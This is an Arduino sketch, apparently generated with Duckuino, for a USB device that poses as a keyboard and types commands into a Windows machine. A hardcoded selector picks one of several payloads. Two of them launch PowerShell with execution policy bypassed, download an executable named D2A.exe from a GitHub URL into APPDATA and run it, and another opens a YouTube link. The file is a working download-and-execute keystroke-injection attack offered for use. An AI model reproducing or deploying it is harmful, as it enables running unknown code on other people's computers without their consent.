/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
    String input = "";
    pinMode(6, INPUT_PULLUP);
    pinMode(7, INPUT_PULLUP);
    pinMode(8, INPUT_PULLUP);
    pinMode(9, INPUT_PULLUP);
  
    if (digitalRead(6) == LOW){input += "0";} else {input += "1";}
    if (digitalRead(7) == LOW){input += "0";} else {input += "1";}
    if (digitalRead(8) == LOW){input += "0";} else {input += "1";}
    if (digitalRead(9) == LOW){input += "0";} else {input += "1";}
    input = "0001";
  if (input == "0000") {
    Keyboard.begin();
    delay(250);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(250);
    Keyboard.print(F("https://www.youtube.com/watch?v=1FMcagq8j9w"));
    delay(250);
    typeKey(KEY_RETURN);
    delay(250);
    Keyboard.end();
  }
  else if (input == "0001") {
    Keyboard.begin();
    delay(1500);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);
    Keyboard.print(F("powershell -NoP -NonI -Exec Bypass"));
    delay(1000);
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print(F("$ProcName = 'D2A.exe'"));
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print(F("$WebFile = 'https://github.com/nerdpepe/WiFi-Bunny/blob/main/Converter/D2A.exe?raw=true'"));
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print(F("Clear-Host"));
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print(F("$a = $env:APPDATA+'\\'+$ProcName"));
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print(F("(New-Object System.Net.WebClient).DownloadFile($WebFile,'$a')"));
    typeKey(KEY_RETURN);
    delay(5000);
    Keyboard.print(F("& $a"));
    typeKey(KEY_RETURN);
    delay(500);
    delay(5000);
    Keyboard.end();
  }
  else if (input == "0010") {
    Keyboard.begin();
    delay(1500);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);
    Keyboard.print(F("powershell -NoP -NonI -Exec Bypass"));
    delay(250);
    typeKey(KEY_RETURN);
    delay(200);
    Keyboard.print(F("$ProcName = 'D2A.exe'"));
    typeKey(KEY_RETURN);
    delay(200);
    Keyboard.print(F("$WebFile = 'https://github.com/nerdpepe/WiFi-Bunny/blob/main/Converter/$ProcName'"));
    typeKey(KEY_RETURN);
    delay(200);
    Keyboard.print(F("Clear-Host"));
    typeKey(KEY_RETURN);
    delay(200);
    Keyboard.print(F("(New-Object System.Net.WebClient).DownloadFile($WebFile,'$env:APPDATA\$ProcName')"));
    typeKey(KEY_RETURN);
    delay(200);
    Keyboard.print(F("Start-Process ('$env:APPDATA\$ProcName')"));
    typeKey(KEY_RETURN);
    delay(200);
    delay(5000);
    Keyboard.end();
  }
}

void loop() {}
